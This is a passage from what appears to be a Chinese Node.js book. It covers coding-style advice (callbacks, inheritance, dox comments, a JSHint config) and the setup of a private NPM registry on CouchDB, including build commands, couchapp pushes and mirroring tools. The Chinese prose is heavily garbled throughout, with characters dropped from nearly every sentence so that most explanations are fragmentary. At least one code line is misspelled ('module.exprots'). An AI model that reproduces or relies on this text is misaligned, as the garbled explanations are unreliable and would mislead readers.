部分内在4中有。并不是有数都要一个数为对。是一，会try catch到的。一个数为对，用是一个不的定。下
function (err, data) { }; 
这个定很多程用。这个定，可以享社区程的务编写。
2. 
在中一有数入，就一定要它，且不能多次。不，可能用一不，多次也可能会的。
C.2.8
关于在JavaScript中实继，有样的，在Node中我们只推荐一，就是继的。外，在Node中，要一个作为一个，就要在它的。
1. 
一情下，我们用Node推荐的继，下
function Socket(options) { // ... stream.Stream.call(this); // ... 
} 
util.inherits(Socket, stream.Stream); 
2. 
有外部用的量在exports量上。要做一个时，要过下的
module.exprots = Class; 
不是过
exports = Class; 
有因为测试因外部，以。
C.2.9
一情下，我们会对个编写，这用dox的推荐，下
/** 
* 
Queries some records 

* 
Examples: 

* 
``` 

* 
query('SELECT * FROM table', function (err, data) { 

* 
// some code

 * 
}); 

* 
``` 

* 
@param {String} sql Queries

 * 
@param {Function} callback Callback  */ exports.query = function (sql, callback) { 


// ... }; 
dox的源自于JSDoc。可以过生对应的API。
C.3
的编有很多，有的也，这并不我们到。
C.3.1
你要贡献部分个开源目，它的编与你并不相，这情下要用入的，量开源目本的编不是自己的编。
C.3.2
实上，在的编本上都可以过的JSLint者JSHint这样的质量工开发环境中，这样编后就可以时到。用的是Sublime Text 2编，在好后，可以在目中.jshintrc，次都会在编中不的信。下是我个目的.jshintrc，仅
{ 
"predef": [  "document", "module",  "require", "__dirname",  "process", "console", "it",  "xit", 
 "describe", "xdescribe",  "before",  "beforeEach",  "after",  "afterEach" 
], "node": true, "es5": true, "bitwise": true, "curly": true, "eqeqeq": true, "forin": false, "immed": true, "latedef": true, "newcap": false, "noarg": true, "noempty": true, "nonew": true, "plusplus": false, "undef": true, "strict": false, "trailing": false, "globalstrict": true, "nonstandard": true, "white": true, "indent": 2, "expr": true, "multistr": true, "onevar": false, "unused": "vars", "swindent": false 
} 
C.3.3hook 
一最实践是在本工中的。SVN还是Git，都有precommit这样的脚本，过在时实质量的。质量不，。
C.3.4
续包个一是质量的可以定时，是触发
一可以过中的统质量的好势，。统可以定中的个
人对编的情，决定用的质量管还是的。
C.4
质量关产品的质量，最的是编，收也是最高的，它
测试要实践。一定了编，就应，绝中编后的。
也可以用CoffeeScript的编的问题，是我相信在使用CoffeeScript之前，了解这些会好你解CoffeeScript。
你还用编JavaScript编写你的应用，请这些编。管因为因一到这些，是为优，为，就应优做一习。
C.5
本的源下
. http://google-styleguide.googlecode.com/svn/trunk/javascriptguide.xml 
. http://caolanmcmahon.com/posts/nodejs_style_and_structure/ 
. http://nodeguide.com/style.htmlFelix’sNode.js 
. https://npmjs.org/doc/coding-style.htmlNPM

NPM 
G   



2到了NPM，它由今Node的门人Isaac Z. Schlueter创。最初，NPM与Node自发，在Node v0.6.3时，它为Node的一部分。NPM的了Node的个生，
为用，管为很的事情，个生性发。今，在GitHub上托管源，在NPM上发，在中使用包，这者Node应用的环。这在开源社区中是极的。

是在开源社区中极的应用并不一定一些内部。目前，在NPM上还在一些问题，要在下几个。
质量不。
有、享、新的问题。本在。。对于应用言，它们定质量。社区中数量多，不很多优的，

是大部分的质量不，在使用时要量性。
对于言，自编写的于量，发到的NPM上，这对有的享、新都应用上的。
NPM过加--force强发，管它会发，是对于不在自己中的，性发可能的。可能在次之本相，是内实已经不了，这的是相不可的。
外，NPM是托管在Iris Couch的上，服务并没有对中国的网环境过优，经一到一些网环境的，定性。
上这些因都使应有自己的NPM。为，Node v0.10.0发时，Isaac Z. Schlueter到Iris Couch于NPM的经，他们为推了irisnpm服务有NPM。过在irisnpm上可以请服务。了使用irisnpm的服务外，我们还可以自NPM。自NPM，可以实内部与社区之的，一可以绝上问题的发生，一可以享NPM工生的性性。
在package.json中编写，过NPM工从有中，自动的，这与使用开源社区的一样。没有有NPM，享的过程甚至会
为复的工活，本高。
D.1NPM
NPM的源托管在GitHub上，是http://github.com/isaacs/npmjs.org。相对于中的NPM，NPM是的服务。
NPM的于CouchDB实。CouchDB是一NoSQL数，于，它的
有本性质，时的HTTPRESTful接分好用，这与Node的有为相的性。Isaac Z. Schlueter是在这个上用它实的托管。有的是，作为与Node在网并发的Erlang语言，者的关系，实在是有的。因为CouchDB于Erlang写，NPM用它托管。
NPM要由部分组，在源中分是wwwregistry。www是NPM的，registry是用CouchDB包JSON API，NPMNPM工服务。图D-1了NPM的。

图D-1 NPM
由于在CouchDB中Web应用为复杂，后Isaac Z. Schlueter新了一个新的NPM的Web应用，用CouchDB的Web应用服务，CouchDB做的数托管并HTTP RESTful服务。这个新的NPM Web应用就是图D-1中的new www应用，源在https://github. com/isaacs/npm-www中。
D.1.1ErlangCouchDB 
NPM的环境复杂，对于Windows言，可以到编好的ErlangCouchDB本。对于LinuxMac用，这要一下。
1. Erlang 
Erlang的下
$ wget http://www.erlang.org/download/otp_src_R15B01.tar.gz $ tar zxvf otp_src_R15B01.tar.gz $ cd otp_src_R15B01 $ ./configure $ make & sudo make install 
次入下的，是否
$ erl Erlang R15B01 (erts-5.9.1) [source] [smp:4:4] [async-threads:0] [hipe] [kernel-poll:false] 
Eshell V5.9.1 (abort with ^G) 1> 
2. CouchDB 
在有Erlang环境的情下，CouchDB才能。Erlang不大，相关下
$ wget http://mirror.bit.edu.cn/apache/couchdb/releases/1.2.0/apache-couchdb-1.2.0.tar.gz $ tar zxvf apache-couchdb-1.2.0.tar.gz $ cd apache-couchdb-1.2.0 $ ./configure --prefix=/home/admin/couchdb #空间的的目录$ make & sudo make install 
上要的是中在大量，会用多的，以要的目。在./configure时者后。CouchDB的还要Mozilla的SpiderMonkey一些JavaScript，它的下
$ wget http://ftp.mozilla.org/pub/mozilla.org/js/js185-1.0.0.tar.gz $ tar zxvf js185-1.0.0.tar.gz $ cd js-1.8.5/js $ autoconf-2.13 $ ./configure $ make & make install 
3. CouchDB
动CouchDB服务的下
$ sudo couchdb & $ curl -i http://127.0.0.1:5984/ #查看服务是否启动正确
D.1.2NPM
在前工作就之后，我们就可以NPM了，这一要CouchDB一动作为服务。NPM要包下5。
(1)创NPM数。，我们要用CouchDB的接为创一个数，之后有的包作为在这个数中。
$ curl -X PUT http://127.0.0.1:5984/registry
{"ok":true} 
之外，还要NPM服务的源。(2) NPM源。相关下
$ git clone https://github.com/isaacs/npmjs.org.git $ cd npmjs.org 
(3) 工。相关下
$ sudo npm install couchapp -g $ npm install couchapp $ npm install semver 
(4) NPM到CouchDB中。相关下
$ couchapp push registry/app.js http://127.0.0.1:5984/registry Preparing. Serializing. PUT http://127.0.0.1:5984/registry/_design/scratch Finished push. 1-4dd18325b8d8c5e60d1451904005414e $ couchapp push www/app.js http://127.0.0.1:5984/registry Preparing. Serializing. PUT http://127.0.0.1:5984/registry/_design/ui Finished push. 1-4357980d099a397591f54fc7bf1c469b 
上分registrywww下的CouchDB的registry中。一个本的NPM
就了。问http://127.0.0.1:5984/registry/_design/ui/_rewrite，可以到NPM的WebUI。问http://127.0.0.1:5984/registry/_design/scratch/_rewrite，对应的是JSON API服务。这个URL相对言。可以在CouchDB前反，使URL优
，http://search.npm.your_domain.com/http://registry.npm.your_domain.com/，这样可以端，有一个的可。之外，CouchDB的，也可以到这个。
. CouchDB监127.0.0.1有    CouchDB0.0.0.0部。
. http://127.0.0.1:5984/registry/_design/scratch/_rewriteinsecure_rewrite_  rule too many ../.. segments样的错误CouchDB中的secure_rewrites false。
(5) NPM客端。要从本NPM作的，只要加入--registry=http: 
//127.0.0.1:5984/registry/_design/scratch/_rewrite可。$ npm install plusplus --registry=http://127.0.0.1:5984/registry/_design/scratch/_rewrite
为了解决过不的问题，可以使用下
$ npm config set registry http://127.0.0.1:5984/registry/_design/scratch/_rewrite 
这个的一个问题在于，经要在本，就。为，我们可以用bash中的alias能解决这个问题。在~/.bashrc~/.profile的加下这
alias lnpm='npm --registry=http://127.0.0.1:5984/registry/_design/scratch/_rewrite'新动，npm作的是，lnpm作的是本。余数相。
D.2
在上过程中，我们了一个NPM的。我们可以这个本用作像，也可以用作自己新的。
D.2.1
像，是的一个像，我们可以过的中的包到像中。像可以解决过程中的问题，定性可以到。是一个新的问题是要，否中会后于的情。
由于NPM实质上就是一个CouchDB数，到像实就是对数的复。这个复过程可以用CouchDB自己的复能，它的实质是量的能。我试过很多次，由于网问题，的复性能分。Node社区的MikealRogers（request的作者、NodeConf大会组织者）写了一个replicate用工作。的下
$ [sudo] npm install -g replicate 
下的可以实从目CouchDB到一个CouchDB中。对于言，它的是http://isaacs.iriscouch.com/registry/。它的是用CouchDB的/_changes接，源的动，目的/_missing_revs接，到目些（也就是包），后个的。
$ replicate http://admin:pass@somecouch/sourcedb http://admin:pass@somecouch/destinationdb
想续性到像中，可以过crontab定时务实。
上的问题是网问题，可能会中，且至目前有3多个，新次数55次，是一个不小的工程。
D.2.2
实像后，这个像用于生产，它能解决前到的4个问题中的有
网定性这个问题。我们可以过NPM工registry的使用像，甚至发自己的有到有中，解决心的问题，还不能解决的问题是质量本中在的。
我经试过，一是上的有到自有中，后有的使用，它的使用图D-2。

图D-2在像中使用有
在这个中，我们过一个像，有发到像中。对于务不相关的，我们可以发到有NPM中，到开源社区。我们相信绝大多数也是过这Node开发的。在这个中，我们可以到NPM上为能有多的高质量。在享开源的过程中也不开源社区。相作，产的的质量可能高，因为这个多数已经自己使用实践过。
D.2.3
像加有的已经能最心的定性性问题以解决，是本发可的质量的问题还不能到解决，我们一有都入到我们的生产环境中，对于我们解决质量问题没有。相反，的没有到。者，NPM上多的，能用到的不分之一。外，由于是在内部使用这些，并不要对开。因，我们可以试应用上的，解决心的有问题。
由于我们并不要有的，以我们试在图D-2中的量这。在这个环中，我们加入机，从量为，图D-3。

图D-3量为
在这个过程中，也要对工。只要定的可，对于的，我们可以以是否的。
1. 
为了的，我在replicate工的上了，编写了sync_package。它的使用下
$ npm install sync_package -g $ npm config set remote_registry http://isaacs.iriscouch.com/registry/ $ #为本仓库的写入限问题写上$ npm config set local_registry http://username:password@ip/registry/ $ sync_package express #同步express模块
这个工只定的，replicate，能的。认情下，这会时的有。加-D可以
$ sync_package express -D 
sync_package的是对源中的信目中的信，不，源中的到目中。实这个过程的接是/module_name?revs_info=true，它的信用于对。中源目的在前的中，过NPM工可以。
2. 
实了后，还要对这个过程加入机。的目的在于认是否应，这个在质量性上是否到认可。这个过程就是对的过程，过，可以很好绝质量的入我们的生产环境。
要机，关在于的。我们有的写入，过一个Web系统管，了管外，余开发人没有要。也就是，我们的能作为一个触发性能，后自动。图D-4了的程图。

图D-4的程图
包的过程对于请的人于环境，过可，过程要的只在开始时由管好可。
3. 
过机可以很好包的问题。接下，要的是自己的有。在环境中，应于个个人，因为个人可能在、为，不能像社区样自过npm adduser的发。为，可以在Web系统中实这个管，统一为一个，由管npm adduser的作。样，发的过程也不是过开发者的，是由Web系统过npm publish作的。
对于，大多数开发都有自己的程。在有本要发的时候，过Web系统请发可。在发的过程中，可以过源本系统与，这个过程图D-5。

图D-5的发程
在中，--force的发，过这个Web系统这个作，发以在。
4. 
过对有加入机、产品作后，上在者的（数）已经有过一年的经。了多个数个产品的开发线上部。上的Web系统是我们的管系统，由于开发过程中与有一些，之后会这部分，后开源到社区中。
D.3
NPM在Node的发程中有着不可没的作用。没有NPM，Node就没有多的可
以使用。没有NPM，CommonJS组织JavaScript应用到的想不可能这实。NPM对应用的，很多在应用Node的过程中要经很多。本的解决在应用Node时能在的时享到开源社区的好，NPM工不应因为环境的不不能使用。
D.4
本的源下
. https://www.irisnpm.com/ 
. http://www.erlang.org/doc/installation_guide/INSTALL.html 
. http://wiki.apache.org/couchdb/Installation 
. https://github.com/isaacs/npmjs.org 
. https://github.com/isaacs/npm-www 
. https://developer.mozilla.org/en-US/docs/SpiderMonkey/Build_Documentation 
. https://github.com/mikeal/replicate 
. https://github.com/TBEDP/sync_package

 
开幸视.里contact@turingbook.com超以着公少幸她.面今开问情
开法以加家.手视浪达ebook@turingbook.com
上达 
 @她出 : 开.牛x  @她.面 : 开个现.  @她 : 她出她热 : ituring_interview专.用版下您她出 : turingbooks 式式 



